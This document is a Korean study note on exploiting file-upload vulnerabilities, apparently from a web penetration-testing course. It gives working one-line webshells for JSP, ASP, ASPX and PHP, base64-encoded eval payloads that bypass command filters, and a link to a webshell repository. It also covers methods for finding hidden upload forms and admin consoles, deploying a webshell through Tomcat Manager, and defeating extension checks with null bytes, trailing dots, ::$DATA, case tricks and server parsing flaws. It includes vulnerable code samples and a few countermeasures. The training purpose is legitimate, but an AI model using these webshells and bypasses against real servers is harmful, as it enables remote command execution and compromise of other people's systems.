JAVA - 파일 업로드 X 
=> 라이브러리 => 업로드 O 

2가지
1) cos.jar (O' Reilly) => 간편! / 파일명 핸들링이 어려움
2) commons-fileupload.jar (Apache) => 복잡 / 디테일 작업 

Spring ~ 2.0 => cos.jar => CosMultipartResolver
Spring 2.5 ~ => commons

=> 라이선스 
구글에 cos.jar검색 

apache-tomcat-8.5.53 > webapps > ROOT > index.jsp

<%@ page Language="java" contentType="text/html; charset=UTF-8" %>
<form action="upload.jsp" method="POST" enctype="multipart/form-data">
<input type="file" name="userfile">
<input type="submit" value="UPLOAD">
</form>


<%@ page Language="java" contentType="text/html; charset=UTF-8" %>
<%@ page import="com.oreilly.servlet.MultipartRequest" %>
<% 
  String path = request.getRealPath("upload");
  
  MultipartRequest multi = new MultipartRequest(request, path, 1024*10, "UTF-8");
  String filename = path + "\\" + multi.getFilesystemName("userfile");
  String name = multi.getParameter("name");
  out.println(name);
%>

<li>업로드 성공 : <%filename%></li>

####웹쉘 종류 ####

JSP 웹쉘 : JSP File Browser
PHP 웹쉘 : C99shell, r57shell

웹쉘 깃허브 
https://github.com/tennc/webshell
jsp/jsp_File_browser.jsp 웹쉘 

웹쉘 탐지 솔루션 
MetiEye
Anti-webshell
F1 WSFinder
WSS ShellMonitor 통합웹서버보안솔루션 


###언어별 시스템 함수 ##############
언어    시스템 함수 
PHP     passthru, system, '(백 쿼터), execl, popen, escapeshellcmd, eval, shell_exec, assert
JSP     Runtime.getRuntime().exec(""), processBuilder("")
ASP     CreateObject("wscript.shell").exec("cmd/c" & cmd), eval, Execute
ASPX    WinExec(), ShellExecute()

###언어별 원라인 웹쉘 소스코드 
JAVA <% Runtime.getRuntime().exec(request.getParameter("val")); %>
ASP <% eval request("val") %>
ASPX(.NET) <%@ Page Language="Jscript" %><% eval(request.Item["val"],"unsafe"); %>
PHP <?php @eval($_POST["val"]); ?>, <?php system($_POST["val"]); ?>
    @eval함수로 업로드하면 cmd.php?val=echo "test";
                                   val=system("ipconfig"); // ipconfig 차단 시 system("ip"."co"."nfig"); 이렇게 해야 출력됨
                                   위 우회가 차단될 시 base64 encoding : system("ipconfig"); -> cmd.php?val=eval(base64_decode("c3lzdGVtKCJpcGNvbmZpZyIpOw=="));
				   cmd.php?val=eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"));&cmd=whoami //system($_GET["cmd"]);=> c3lzdGVtKCRfR0VUWyJjbWQiXSk7
원라인 웹쉘 클라이언트 프로그램 : CAIDAO, Chopper 

####################################os 정보출력 JSP 파일####################################
<%
	out.println(System.getProperty("os.name").toLowerCase());
%>

###md5.php###
<?php
	$input = "loze";
	echo md5($input);
?>

###공격대상 탐색###
공격자 -> 페이지 -> 업로드 
공격자 -----------> 업로드

CASE1) 정상적인 접근 방법
 1) 게시판을 통한 업로드 확인 
 2) 이미지 업로드기능 확인 
 3) 이력서 페이지 내 업로드 기능 확인 

CASE2) 비정상적인 접근 방법
 1) 웹 페이지 내 업로드 관련 코드 찾기 
   - .js 파일 내 업로드 폼 관련 정보 확인 
   - 주석 제거 후 업로드 폼 활성화
   
 2) 파일 다운로드 취약점을 통한 접근
   - /common/fileDownload.jsp?path=../common&filename=fileUpload.jsp
   - 업로드폼은 없는데 업로드 모듈만 있는 경우는 업로드기능을 없애놓음
   
 3) WAS 관리자 콘솔 & 관리자 페이지 접근
   - URL 유추(admin, adm, manager, rhksflwk, administrator, root, www1.victim.co.kr/admin)
   - 관리 콘솔페이지(tomcat manager, jeus 관리콘솔 페이지)
   - war(web app archive)업로드 후 war 디플로이로 압축해제
   - WAS별 관리 콘솔 URL 
    : tomcat - http://url.manager.html
    : jeus - http://url:9743/webadmin
             http://url:9744/webadmin
    : Weblogic - http://url:7001/console
    : WebSphere - http://url:9060/ibm/console
    : Jboss - http://url:9990/admin-console
    	    
 4) 접근 권한 없는 업로드 폼 페이지 직접 접근
   공격자 게시판 목록 -> 게시글 작성 -> 게시글 작성 액션 페이지 -> webshell.jsp
   - 게시글 작성 페이지 직접 접근(boardList.do, boardwrite.do, boardcreate.do, boardReg.do boardRegister.do,p010101)
   
 5) 에디터 샘플 페이지 혹은 기본 페이지 접근 (fck에디터-> ck에디터로 바뀜)
   - /fckeditor/, /FCKeditor/, /ckeditor/, /CKEditor/, /Ckeditor/, /editor/
   - /디렉터리/fckeditor.js, /fckconfig.js, /ckeditor.js, /config.js
   - www.test.co.kr/js/ 입력해서 응답값과 /aaa/ 디렉터리 응답 비교하여 확인
   - /디렉터리/_sample/index.html, /디렉터리/sample/index.html
    ex) /디렉터리/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp
        /디렉터리/editor/filemanager/browser/default/browser.html?Type=File&Connector=[host]/디렉터리/editor/filemanager/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Images&CurrentFolder=
	/디렉터리/editor/filemanager/browser/default/browser.html
	/디렉터리/editor/filemanager/browser/default/connectors/test.html
        파이썬으로 사전파일 스크립트 만듬
   - CKEditor는 웹 디렉터리 상으로 업로드가 되며, 경로를 반환하기 때문에 업로드 경로를 파악할 필요가 없다.
   
 6) 구글 해킹을 통한 업로드 페이지 접근
    공격자 -> 구글 -> 업로드 페이지 
   - 리뉴얼됬을 경우 구글해킹으로 이전버전을 볼 수 있음, 구글의 캐쉬페이지에 저장된 페이지가 있음 
   
 7) 유추를 통한 직접 접근(위 방법이 다안될 경우 최후 수단)
   - 파일 업로드 모듈 URL 유추를 통한 접근 (FileUpload.jsp)
   
###톰캣 매니저를 통한 WAR 디플로이 실습 ####
 [전제조건]
  tomcat 매니저를 사용해야되고, 계정정보 게싱 혹은 tomcat-users.xml파일을 다운로드 받아야됨
  
 1)/conf/tomcat-users.xml에서 사용자 추가
 <user username="loze" password="loze" roles="manager-gui" />
 2)manager - ID/PW 로그인

 3)war파일 생성 : webapps/ROOT> jar -cvf loze.war ws3_.jsp 
 manager - 배치할 WAR 파일에 war파일 업로드 - 배치클릭하면 loze.war가 생성됨

 4) 웹쉘 업로드 경로 접근 가능 - http://127.0.0.1:8080/loze/ws3_.jsp 
 
 5) 웹쉘 사용후 반드시 제거하고 접속안되는거 확인해야됨
 
 
###환경 분석 ###
 Step1) 운영체제 파악 
 - 대소문자 구분하여 Windows or Linux/Unix 파악
 - 테스트 사이트 : tmax technet 구글검색하여 사이트 접속
 Step2) 언어파악 
 
### 기본로직 분석###
 1) 이미지, 텍스트 등 허용된 업로드 파일 업로드를 해서 테스트 해봄
 
 2) 서버사이드 테스트 파일 업로드 
 PHP
 <? echo "test"; ?>
 
 JSP 
 <% out.println("test"); %>
 
 ASP
 <% Response.Write("test"); %>
 
 3) 웹쉘 업로드
 
###심화 로직 분석####
 - 검증로직 유/무 - 경로 출력 유/무, 검증 로직 존재 유/무 확인 
 - 검증 로직 우회 
 - 업로드 경로 파악
 - 업로드 경로 변조 
 
###검증 로직 우회 ####
 - 확장자 검증 (jpg, png, txt, jsp) - 블랙리스트 방식 (jpg, png, gif)
 				    - 화이트 리스트 방식 (jsp, jspf, jspx, jsv, jsw)
				    
			   장점                     단점                    알맞은 기능
   블랙리스트 방식 : 다양한 파일 업로드 가능, 다양한 우회 가능성 존재, 다수 파일 업로드(ex: 자료실)
   화이트 리스트 방식 : 우회 가능성이 제한적, 다양한 파일 업로드 불가능, 특정 파일 업로드(ex: 이미지 업로드)
   테스트) 블랙인지 화이트 인지 점검, php안되면 a 업로드 시도해서 체크
   
   
   Type1) 검증되지 않은 확장자 사용
    언어별 서버사이드 확장자 
    언어				
    JAVA		jsp / jspx / jspf / jsv / jsw
    ASP			asp / asa / cer / cdx 
    ASPX(.NET)		aspx / asax / ascx / ashx / asmx / soap
    PHP			php / php3 / php4 / php5 / html / phtml / inc
    C:\APM_Setup\Server\Apache\conf\extra\httpd-php5.conf 파일에 php, html 파일 실행되는 것을 확인
   tennc/webshell/jspx
   
   Type2) 확장자 검증 로직 설계 오류로 인한 보안 결함 악용
    CASE1) 윈도우 환경에서의 잘못된 블랙리스트 방식 사용으로 인한 보안 결함 발생 
    
    블랙리스트 기반 확장자 검증
    webshell.php[비호환문자]
    
    - 비호환 문자(.(마침표), 공백, ::$DATA(ADS)
    - 윈도우 + 블랙리스트 기반이면 webshell.php. 으로 우회됨 
    
    취약 코드1) webshell.php. null값 검증 안함
    $ext_offset = strrpos($filename, ".");
    $ext = substr($filename, $ext_offset + 1, 3); //Null 값
    if($ext == "php" || $ext == "php3" ...) { //Null 값 검증이 없으므로 검증 우회
    	echo "<script>alert('허용된 확장자가 아닙니다.');
		history.back(-1);</script>";
	exit;
    }
   
   CASE2) webshell.php[공백], webshell.php::$DATA
   
   취약 코드2)
    $file_info = pathinfo($path.$filename);
    $ext = strtolower($file_info["extension"]); 		//php[공백], php::$DATA
    $ext_arr = array("", "php", "html" ...);
    if(in_array($ext, $ext_arr)) { 		//검증 우회 가능
    	 echo "<script>alert('허용된 확장자가 아닙니다.');
 		 history.back(-1);</script>";
	 exit;
     } 
    
   취약코드3) phP 검증우회 
    $file_info = pathinfo($path.$filename);
    $ext = $file_info["extension"]; 		//phP
    $ext_arr = array("", "php", "html" ...);
    if(in_array($ext, $ext_arr)) { 		//검증 우회 가능
   	 echo "<script>alert('허용된 확장자가 아닙니다.');
		 history.back(-1);</script>";
	 exit;
     } 
   취약코드4) webshell.png.php 확장자 파싱 
    $ext_offset = strpos($filename, ".");    //대응방안 : strrpos로 하면 뒤에서부터 마침표문자를 찾아서 확인하는 방식
    $ext = substr($filename, $ext_offset + 1, 3);
    
    if($ext != "png" && $ext != "gif" && $ext != "jpg") {
    	echo "<script>alert('허용된 확장자가 아닙니다.');
	      history.back(-1);</script>";
	exit;
    }
    
    CASE3) 로직 설계 오류 
     --aBoundaryString
     Content-Disposition: form-data; name="extensionCheckFlag"
     
     N -> Y
     --aBoundaryString
     Content-Disposition: form-data; name="myFile"; filename="webshell.jsp"
     Content-Type: application/octet-stream
     
     [DATA]
     .. 
 
   Type3) Null Byte 문자 사용
    - webshell.jsp%00.jpg
    -trim : %00test%00upload%00와 같이 맨앞 맨뒤만 trim이 되고 중간에는 안됨
            ./upload/aa.php a_ha.png
	    
    - 널바이트 공격 대응방안 
    : 널바이트 문자 제거 -> \0 > 제거
    : 널바이트 문자 검증 -> \0 > 에러처리
    : 정규식 검증
    : 이스케이프 처리 -> \0 > \\0
    
   Type4) WAS 취약점 악용 
 - IIS 세미콜론 취약점
  cmd.asp;.jpg
 - IIS 디렉터리 파싱 취약점 
 
 - Apache 다중 확장자 취약점 
  webshell.php.jpg, webshell.php.aa
  : APM_Setup/Server/Apache/conf/mime.type에 정의된 확장자 파일확인
  
   
 - 이미지 검증 (업로드된 파일이 이미지인지 검증) 
 - 파일 사이즈 검증 
 -----------------------------31384565426772145642512557563
 Content-Disposition: form-data; name="webshell.jsp[NULL]"; filename="test_page.aspx"
 Content-Type: application/octet-stream 
 - NULL Byte 문자 사용 대응방안 
 : Null Byte 문자 검증, 서버 측에서 생성된 임의의 파일명과 검증된 확장자 바인딩, 웹 디렉터리가 아닌 다른 경로 업로드 
 
####이미지 검증####
 Type 2-1 타입 검증 
  : Content-Type : application/octet-stream -> image/jpeg, image/png
 Type 2-2 헤더 검증
  GIF 이미지 파일 헤더 - GIF89 혹은 GIF87
  00 01 02 03 04 01234
  47 49 46 38 39 GIF89
  
  PNG 이미지 파일 헤더 : 0x89PNG
  00 01 02 03 0123
  89 50 4E 47 %.PNG
  
  JPG 이미지 파일 헤더 : 0xFF0xD8
  00 01 02 03 0123
  FF D8 FF E0 ----
  
 - 대응방안 
  확장자 검증로직 추가, 웹 디렉터리가 아닌 다른 경로 업로드 + 이미지 뷰어 사용, 웹 서버 웹 디렉터리에 업로드 
  
 Type 2-3 사이즈 검증
  언어별 원라인 웹쉘 소스코드 
  JAVA
  
  ####검증로직 우회 마무리###
  1) 확장자
  2) 이미지
  3) 파일 사이즈 
  
####심화 로직 분석 #####
업로드 경로 파악 기법
 1) 파일 다운로드 취약점을 통한 업로드 경로 파악 
 2) SQL Injection 취약점을 통한 업로드 경로 파악 
 3) 유추와 추론을 통한 업로드 경로 파악 
 4) 에러를 통한 업로드 경로 파악 
 
심화로직 분석 1-3 들을차례


 
 
























